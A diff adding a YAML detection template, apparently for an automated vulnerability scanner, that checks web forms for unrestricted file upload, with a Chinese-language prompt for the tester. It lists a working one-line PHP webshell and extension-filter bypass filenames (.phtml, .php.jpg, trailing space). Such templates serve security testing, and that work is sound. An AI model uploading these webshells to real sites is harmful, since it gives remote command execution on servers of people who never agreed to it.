@@ -1,0 +1,14 @@
+type: UPLOAD
+name: 文件上传
+description: 上传点未校验文件类型，可传 webshell
+need_detect: 目标存在文件上传功能（表单含 file 字段）
+prompt: |
+  文件上传检测：
+  1. 上传正常文件，观察路径/类型校验
+  2. 上传 PHP/JSP webshell，尝试绕过扩展名过滤（.phtml、大小写、双扩展名、.php.jpg）
+  3. 上传后访问 URL 确认是否被解析执行
+payloads:
+  - "shell.php: <?php system($_GET['c']); ?>"
+  - "shell.phtml"
+  - "shell.php.jpg"
+  - "shell.php "
